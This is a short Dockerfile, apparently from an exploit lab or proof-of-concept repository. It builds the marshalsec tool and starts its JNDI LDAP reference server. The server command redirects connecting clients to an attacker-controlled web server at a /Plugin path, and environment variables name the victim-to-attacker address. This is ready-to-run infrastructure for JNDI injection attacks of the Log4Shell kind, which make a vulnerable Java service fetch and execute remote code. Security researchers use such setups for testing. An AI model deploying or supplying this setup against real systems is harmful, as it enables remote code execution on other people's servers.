FROM maven:3.8-jdk-11
EXPOSE 1389
RUN mkdir /marshalsec
COPY marshalsec/ /marshalsec
WORKDIR /marshalsec
RUN mvn package -DskipTests

ENV VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME=$VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME
ENV VICTIM_TO_ATTACKER_HTTP_PORT=$VICTIM_TO_ATTACKER_HTTP_PORT

# sleep 5 for race condition
RUN sleep 5

# Make marshalsec's LDAP server to redirect the client to the attacker web server
CMD ["java", "-cp", "/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer" ,"http://${VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME}:${VICTIM_TO_ATTACKER_HTTP_PORT}/Plugin"]
